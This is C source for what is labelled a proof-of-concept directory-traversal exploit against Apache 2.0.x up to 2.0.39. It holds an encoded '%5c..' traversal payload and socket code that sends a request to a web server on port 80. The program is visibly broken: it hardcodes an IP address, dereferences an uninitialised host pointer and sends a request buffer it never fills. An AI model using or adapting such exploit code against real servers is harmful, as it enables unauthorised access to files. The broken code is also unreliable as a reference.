#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#define bs "%5c"
char travcode[]= 
"\x25\x35\x63\x25\x32\x65\x25\x32\x65"
"\x25\x35\x63\x25\x32\x65\x25\x32\x65"
"\x25\x35\x63\x25\x32\x65\x25\x32\x65"
"\x25\x35\x63\x25\x32\x65\x25\x32\x65"
"\x25\x35\x63\x25\x32\x65\x25\x32\x65"
"\x25\x35\x63";


void reply(int sock);


void reply(int sock) 
{


int n;
char recvbuf[1024];
fd_set rset;


while (1) {
FD_ZERO(&rset);
FD_SET(sock,&rset);
FD_SET(STDIN_FILENO,&rset);
select(sock+1,&rset,NULL,NULL,NULL);

if (FD_ISSET(sock,&rset)) {
if((n=read(sock,recvbuf,1024)) <= 0) {
printf("Connection closed by foreign ghost.\n");
exit(0);
} 

recvbuf[n]=0;
printf("%s",recvbuf);
} 

if (FD_ISSET(STDIN_FILENO,&rset)) {
if((n=read(STDIN_FILENO,recvbuf,1024)) > 0) {
recvbuf[n]=0;
//write(sock,recvbuf,n);
}
}
}
}



int main(int argc, char *argv[]) {

int sock;
char exp[1024];
struct in_addr addr;
struct sockaddr_in sin;
struct hostent *he;


fprintf(stdout, "\n\tDSR-apache2.0x.c By bob.\n"); 
fprintf(stdout, "Proof Of Concept Code for Apache 2.0.x 2.0.39\n");
fprintf(stdout, "\tDSR-[www.dtors.net]-DSR\n");

if(argc<4) 
{
fprintf(stderr, "\nUsage : %s <host> <dir> <file>\n\n", argv[0]);
exit(1);
} 



addr.s_addr=inet_addr("78.138.189.10");

/* A fresh pair of clean socks ;) */

sock=socket(AF_INET, SOCK_STREAM, 0);
bcopy(he->h_addr, (char *)&sin.sin_addr, he->h_length);
sin.sin_family=AF_INET;
sin.sin_port=htons(80);

/* yummy fresh smelling */

fprintf(stdout, "Hold up bish connecting to host... \n");
if (connect(sock, (struct sockaddr*)&sin, sizeof(sin))!=0)
{
fprintf(stderr, "My socks are all sweaty.\n");
exit(1);
}

else {
/* im exhausted after that...gn */
sleep(3);




write(sock,exp,strlen(exp));

fprintf(stdout, "This is not going to be pritty.\nIm a lion here me ROAR!\n\n");
reply(sock);

close(sock);
exit (0);

}

}


